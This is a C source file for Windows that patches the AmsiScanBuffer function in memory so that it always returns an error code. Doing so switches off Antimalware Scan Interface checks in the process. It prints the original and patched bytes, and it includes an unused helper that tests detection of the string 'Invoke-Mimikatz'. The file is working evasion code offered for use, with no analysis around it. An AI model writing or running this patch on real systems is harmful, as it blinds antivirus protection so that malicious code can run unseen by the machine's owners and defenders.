#include <windows.h>
#include <stdio.h>
#include <amsi.h>

BOOL CheckAMSI( void ) {

    HAMSICONTEXT ctx;
    if ( AmsiInitialize( L"AMSI Text", &ctx ) != S_OK ) {
        printf( "[-] Failed to initialize AMSI context\n" );
        return FALSE;
    }

    LPCWSTR testString = L"Invoke-Mimikatz";
    AMSI_RESULT result;
    HRESULT hr = AmsiScanString( ctx, testString, L"AMSI Test", NULL, &result );
    AmsiUninitialize( ctx );

    if ( hr != S_OK ) {
        printf( "[-] AmsiScanString failed: 0x%08X\n", hr );
        return FALSE;
    }

    printf( "[+] AmsiScanString result: 0x%08X\n", result );
    return result >= AMSI_RESULT_CLEAN;
}

VOID PrintBytes( PVOID pAddress, SIZE_T size ) {
    BYTE* pBytes = ( BYTE* )pAddress;
    for ( SIZE_T i = 0; i < size; i++ ) {
        printf( "%02X ", pBytes[ i ] );
    }
    printf( "\n" );
}

int main( void ) {
    HMODULE hAmsi = LoadLibraryA( "amsi.dll" );
    if ( hAmsi == NULL ) {
        printf( "Failed to load amsi.dll\n" );
        return 1;
    }

    printf( "[+] Amsi.dll loaded at: 0x%p\n", hAmsi );

    PVOID pAmsiScanBuffer = ( PVOID )GetProcAddress( hAmsi, "AmsiScanBuffer" );
    if ( pAmsiScanBuffer == NULL ) {
        printf( "Failed to get address of AmsiScanBuffer\n" );
        return 1;
    }

    printf( "[+] AmsiScanBuffer address: 0x%p\n", pAmsiScanBuffer );

    printf( "[+] Original bytes: " );
    PrintBytes( pAmsiScanBuffer, 6 );

    BYTE patchBytes[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80, // mov eax, 0x80070057 
        0xC3                          // ret
    };

    DWORD oldProtect;
    if ( !VirtualProtectEx( GetCurrentProcess(), pAmsiScanBuffer, sizeof( patchBytes ), PAGE_EXECUTE_READWRITE, &oldProtect ) ) {
        printf( "Failed to change memory protection\n" );
        return 1;
    }

    if ( !WriteProcessMemory( GetCurrentProcess(), pAmsiScanBuffer, patchBytes, sizeof( patchBytes ), NULL ) ) {
        printf( "Failed to write patch bytes\n" );
        return 1;
    }

    if ( !VirtualProtectEx( GetCurrentProcess(), pAmsiScanBuffer, sizeof( patchBytes ), oldProtect, &oldProtect ) ) {
        printf( "Failed to restore memory protection\n" );
        return 1;
    }

    printf( "[+] AmsiScanBuffer patched successfully\n" );

    printf( "[+] Patched bytes: " );
    PrintBytes( pAmsiScanBuffer, sizeof( patchBytes ) );

    system( "pause" );
    return 0;
}